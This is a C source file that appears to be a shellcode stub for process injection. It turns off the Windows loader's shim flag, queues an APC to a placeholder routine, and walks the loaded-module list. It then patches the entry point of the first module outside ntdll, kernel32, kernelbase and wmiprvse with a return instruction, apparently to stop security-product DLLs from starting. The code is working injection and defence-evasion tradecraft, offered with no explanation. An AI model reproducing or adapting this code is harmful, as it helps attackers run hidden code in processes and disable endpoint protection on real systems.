#include <windows.h>

typedef struct UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	WORD LoadCount;
	WORD TlsIndex;
	union
	{
		LIST_ENTRY HashLinks;
		struct
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union
	{
		ULONG TimeDateStamp;
		PVOID LoadedImports;
	};
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
	LIST_ENTRY ForwarderLinks;
	LIST_ENTRY ServiceTagLinks;
	LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef UINT (*_RtlEqualUnicodeString)(PUNICODE_STRING String1, PUNICODE_STRING String2, BOOLEAN CaseInSensitive);
typedef void (*_NtProtectVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection);
typedef NTSTATUS (*_NtQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3);

void go(PLDR_DATA_TABLE_ENTRY LdrDataTable) {

	_RtlEqualUnicodeString RtlEqualUnicodeString =      (_RtlEqualUnicodeString)0xAAAAAAAAAAAAAAAA;
	_NtProtectVirtualMemory NtProtectVirtualMemory =    (_NtProtectVirtualMemory)0xBBBBBBBBBBBBBBBB;
	_NtQueueApcThread NtQueueApcThread =                (_NtQueueApcThread)0xCCCCCCCCCCCCCCCC;
	
	BYTE * g_ShimsEnabled =     (BYTE *)0xEEEEEEEEEEEEEEEE;
	PVOID ApcRoutine =          (PVOID)0xDDDDDDDDDDDDDDDD;

	PLIST_ENTRY listHead = LdrDataTable->InLoadOrderLinks.Flink;
	PLIST_ENTRY entry;
	PLIST_ENTRY next;
	BOOLEAN b;

	unsigned char patch[] = { 0xc3 };

	wchar_t ntdll[] =       { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	wchar_t kernel32[] =    { L'k', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
	wchar_t kernelbase[] =  { L'k', L'e', L'r', L'n', L'e', L'l', L'b', L'a', L's', L'e', L'.', L'd', L'l', L'l', L'\0' };
	wchar_t wmiprvse[] =    { L'w', L'm', L'i', L'p', L'r', L'v', L's', L'e', L'.', L'e', L'x', L'e', L'\0' };

	UNICODE_STRING ntdll_name = {
		.Buffer = ntdll,
		.Length = 0x12,
		.MaximumLength = 0x14 
	};

	UNICODE_STRING kernel32_name = {
		.Buffer = kernel32,
		.Length = 0x18,
		.MaximumLength = 0x1A
	};

	UNICODE_STRING kernelbase_name = {
		.Buffer = kernelbase,
		.Length = 0x1c,
		.MaximumLength = 0x1E
	};

	 UNICODE_STRING wmiprvse_name = {
		.Buffer = wmiprvse,
		.Length = 0x18,
		.MaximumLength = 0x1a
	 };

	/* Set g_ShimsEnabled to FALSE */
	*g_ShimsEnabled = 0;

	NtQueueApcThread(((HANDLE)(LONG_PTR)-2), (PVOID)ApcRoutine, 0, 0, 0);

	DWORD o, n;
	SIZE_T size = sizeof(patch);

	for (entry = listHead->Flink, next = entry->Flink; entry != listHead; entry = next, next = entry->Flink) {
		PLDR_DATA_TABLE_ENTRY currentEntry = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		BYTE res = 0;
		res = RtlEqualUnicodeString(&currentEntry->BaseDllName, &ntdll_name, TRUE);
		res += RtlEqualUnicodeString(&currentEntry->BaseDllName, &kernel32_name, TRUE);
		res += RtlEqualUnicodeString(&currentEntry->BaseDllName, &kernelbase_name, TRUE);
		res += RtlEqualUnicodeString(&currentEntry->BaseDllName, &wmiprvse_name, TRUE);

		if ((BYTE)res == 0) {

			LPVOID p = currentEntry->EntryPoint;
			NtProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), &p, &size, PAGE_READWRITE, &o);
			RtlCopyMemory(currentEntry->EntryPoint, patch, sizeof(patch));
			NtProtectVirtualMemory(((HANDLE)(LONG_PTR)-1), &p, &size, o, &n);

			break;
		}

	}
}
